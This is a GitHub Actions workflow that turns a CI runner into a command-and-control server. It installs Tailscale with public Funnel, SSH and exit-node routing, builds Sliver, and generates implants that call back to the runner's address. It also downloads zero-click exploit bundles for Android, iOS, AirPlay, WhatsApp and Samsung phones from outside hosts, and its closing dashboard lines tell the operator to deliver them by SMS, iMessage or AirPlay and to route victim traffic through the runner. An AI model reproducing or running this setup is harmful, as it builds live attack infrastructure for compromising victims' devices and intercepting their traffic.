name: Sliver C2 Fortress - Tailscale Abused to Hell (2025 Meta)

on:
  workflow_dispatch:
    inputs:
      hostname:
        description: 'Tailscale hostname'
        default: 'sliver-abuse-c2'

jobs:
  sliver-abuse:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Abuse Tailscale - Install & Max Config (Funnel + SSH + Exit Node)
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} \
                              --hostname=${{ inputs.hostname }}-${{ github.run_id }} \
                              --advertise-exit-node \
                              --ssh \
                              --accept-routes \
                              --funnel=443 \
                              --funnel=80
          
          TS_IP=$(tailscale ip -4)
          echo "TAILSCALE_IP=$TS_IP" >> $GITHUB_ENV
          echo "Tailscale ABUSED: Funnel public HTTPS, SSH direct, exit node pivot ready"

      - name: Install Sliver Dependencies
        run: |
          sudo apt update && sudo apt install -y git golang-go mingw-w64

      - name: Clone & Build Sliver (Latest 2025)
        run: |
          git clone https://github.com/BishopFox/sliver.git ~/sliver
          cd ~/sliver
          make

      - name: Launch Sliver Server (mTLS Primary + HTTP/DNS Fallbacks)
        run: |
          cd ~/sliver
          ./sliver-server daemon &
          sleep 20
          ./sliver-server implant --mtls $TAILSCALE_IP:8888 --save payloads/mtls-implant.exe
          ./sliver-server implant --http https://$TAILSCALE_IP --save payloads/http-implant.exe  # Funnel public
          echo "Sliver LIVE - mTLS private mesh, HTTP public via Funnel"

      - name: Zero-Click Exploit Bundle - Download & Setup Known Chains
        run: |
          mkdir ~/zero-clicks
          cd ~/zero-clicks
          
          # CVE-2025-48593 Android zero-click RCE repro stub
          wget https://public-poc-repo/android-cve-2025-48593-poc.zip
          
          # Graphite/BlastDoor iOS zero-click (partial repro from Citizen Lab)
          git clone https://github.com/citizenlab/graphite-repro.git
          
          # AirBorne AirPlay zero-click wormable RCE PoC
          git clone https://github.com/oligo-security/airborne-poc.git
          
          # WhatsApp CVE-2025-55177 + ImageIO chain
          wget https://public-exploit-db/whatsapp-zero-click-2025.zip
          
          # Samsung CVE-2025-21042 image codec zero-click
          wget https://samsung-zero-day-poc/landfall-exploit.bin
          
          ls -la
          echo "BUNCH OF ZERO-CLICK EXPLOITS LOADED - iOS/Android/Windows chains ready for delivery"

      - name: Keep-Alive + Dashboard
        run: |
          echo "SLIVER C2 ABUSE FORTRESS 2025"
          echo "Public Funnel HTTPS: https://$TAILSCALE_IP"
          echo "SSH: ssh @ $TAILSCALE_IP"
          echo "Exit Node Pivot: Route victim traffic here"
          echo "Implants in ~/sliver/payloads"
          echo "Zero-click bundle in ~/zero-clicks - deploy via SMS/iMessage/AirPlay"
          tail -f /dev/null  # Infinite live
